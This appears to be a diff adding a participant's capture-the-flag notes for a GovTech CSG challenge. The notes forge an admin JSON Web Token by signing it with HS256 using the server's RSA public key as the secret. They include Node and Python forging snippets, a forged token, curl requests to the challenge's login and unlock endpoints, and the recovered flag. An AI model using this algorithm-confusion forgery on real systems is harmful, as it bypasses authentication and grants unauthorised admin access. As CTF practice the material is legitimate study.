@@ -1,0 +1,47 @@
+Our agents discovered COViD's admin panel! They also stole the credentials minion:banana, but it seems that the user isn't allowed in. Can you find another way?
+
+Admin Panel
+-----------------------------------------
+eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3MzE0OTgyfQ.hqx7hzlAsx1m08y-ZdGEZyqZnIMtEUs9vvOMG78TWMBO8zwUvwPmqCWRpl6CszbF-h_wdz1zSi1HxGdhegg1PrJ0kUYknbrZGD2XoYUgThm5F1HAgJARDg2XtSBbrgYIXcuOM5h_nGMTnoWLVv8VL-hK2qWJHfcSqdlrfTWh2iC37A5ykNe0N0iMPoXxBuIOkniV678ctzuWSJjbKczJS4ZxtFEPiGwfbWRlmJ7mikRexnSZkH9Ax1J0wG_O8V1Hh62-NrfD18jfVkH1T1KnQYmqwsja4vcXgxm56n-nBSlZhSfUuo-JomrBr4-avoHFMx3Y2npj5wnWhbbqV23ds_r2USGTELx1zjLeykxKASsZbGKgLDWxtXved9dzdqW0bmqwI6MzL522MAPIJcRSQ79Yfvni9B5BhIa0ua60jCAmQcetN17l_WIPSxHJJv9_aj3F5KbE9lYm9n7jiQVaPl_JNn8Y_pEsEx7FMwld5nHIJan7wcJcpDPG3DZSr_TG6bbZ0xwhd_KvRrfL8mOG6v2h_VWC3a4kBjKi3sjOqoSy2wa8NqnwT9Xv_w_KrCe6MtryiCJOcSpv1bxFOiunySkY1GbBynmXBd2k9gDKRdUUT38rTZ3tzfF-HtLpezUD02jy3zgit5N1mxWSTQdcoAP-n9YkvUP4kSO9llBCo5g
+
+
+
+var jwt = require('jsonwebtoken'); var fs = require('fs'); var privateKey = fs.readFileSync('public.pem'); const accessToken = jwt.sign({ username: 'anyuser', role: 'admin' }, privateKey, { algorithm: 'HS256' });
+
+import jwt key = """ -----BEGIN PUBLIC KEY----- MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4Cot1mM0eF5cZUnifKx0 8MJQ59ui9/8DLzWpWWtlPGsB4T9UsaAspndZJafbGFq0v+vGzG+TltJjb1v+tTj8 sqFanc/KWdQZr3WwmuhU95EJ7RRhtEIxTN8Rn1KOKUqZ/Plmf4LrMrMZm66DqaTW H2my5IRShK0i0YpziT9JEeVJtS/zC+UUdbImrOavjD4PDZv14FLEuePMN0mCNcQ5 z5iSQv5j8npbtvMBbeAKMvYyCeIchjW22Dp/tNi4xfI7CaTyPp0pO3+MZ9vJ8O02 YOC7/+tQX2NdveVuKYEg4XTQ/nmiYSK9DeXyO/EGkQzxZjpLv5ZMN07Nau2xpQoG 1Ip4YfDA5Y/MjA8qDgNN0n/pmBaPBHNvFK6mWJllnuOnLpQHCxZNxBudxTLSoXkq XQPRKcdZpbv0kjt/ZpwkoXHfQLToJyZQgQXtEHaW36Ko9Xjq3cDWzkSjADMxaq/5 8SZvPUknm3Mv9KN8zYiePYGUl2aLyKumKF++rlh7a6xJgcBcs10bf0yyeRU3NWWb 0pz4dgdrgh2sXrg/U51VhejnNfvfRf+4Cy1QM4QWbKXZk9sLtLpkfiou/ri3YUn3 txIgfYKa7a5tOtBWSRHHlHOmS58Ab51pmSGdjIeCa+WMie0i5reuRb6WJ27jnvJF G0hytABBbCgeL00ymJK16tUCAwEAAQ== -----END PUBLIC KEY----- """ print(jwt.encode({"username":"minion","role":"admin","iat":1607145664}, key, algorithm='HS256'))
+
+python -c 'import jwt;print(jwt.encode({"username":"minion","role":"admin","iat":1607320016},key=open("public.pem", "r").read(),algorithm="HS256"))'
+b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzMyMDAxNn0.oNbzc6cNBG6KtVNB6Sw9k2Xg0TRGF8QW5PeJ1f_517w'
+
+curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzMyMDAxNn0.oNbzc6cNBG6KtVNB6Sw9k2Xg0TRGF8QW5PeJ1f_517w" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock
+
+govtech-csg{5!gN_0F_+h3_T!m3S}
+
+
+classic JWT downgrade attack:
+https://www.nccgroup.com/sg/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/
+
+to get public.pem:
+yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+var jwt = require('jsonwebtoken'); var fs = require('fs'); var privateKey = fs.readFileSync('public.pem'); const accessToken = jwt.sign({ username: 'anyuser', role: 'admin' }, privateKey, { algorithm: 'HS256' });
+import jwt key = """ -----BEGIN PUBLIC KEY----- MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4Cot1mM0eF5cZUnifKx0 8MJQ59ui9/8DLzWpWWtlPGsB4T9UsaAspndZJafbGFq0v+vGzG+TltJjb1v+tTj8 sqFanc/KWdQZr3WwmuhU95EJ7RRhtEIxTN8Rn1KOKUqZ/Plmf4LrMrMZm66DqaTW H2my5IRShK0i0YpziT9JEeVJtS/zC+UUdbImrOavjD4PDZv14FLEuePMN0mCNcQ5 z5iSQv5j8npbtvMBbeAKMvYyCeIchjW22Dp/tNi4xfI7CaTyPp0pO3+MZ9vJ8O02 YOC7/+tQX2NdveVuKYEg4XTQ/nmiYSK9DeXyO/EGkQzxZjpLv5ZMN07Nau2xpQoG 1Ip4YfDA5Y/MjA8qDgNN0n/pmBaPBHNvFK6mWJllnuOnLpQHCxZNxBudxTLSoXkq XQPRKcdZpbv0kjt/ZpwkoXHfQLToJyZQgQXtEHaW36Ko9Xjq3cDWzkSjADMxaq/5 8SZvPUknm3Mv9KN8zYiePYGUl2aLyKumKF++rlh7a6xJgcBcs10bf0yyeRU3NWWb 0pz4dgdrgh2sXrg/U51VhejnNfvfRf+4Cy1QM4QWbKXZk9sLtLpkfiou/ri3YUn3 txIgfYKa7a5tOtBWSRHHlHOmS58Ab51pmSGdjIeCa+WMie0i5reuRb6WJ27jnvJF G0hytABBbCgeL00ymJK16tUCAwEAAQ== -----END PUBLIC KEY----- """ print(jwt.encode({"username":"minion","role":"admin","iat":1607145664}, key, algorithm='HS256'))
+curl -X POST http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/login -H "Content-Type: application/json" -d '{"username":"minion","password":"banana"}'
+
+
+not really relevant but still:
+https://stackoverflow.com/questions/17143606/how-to-save-public-key-from-a-certificate-in-pem-format
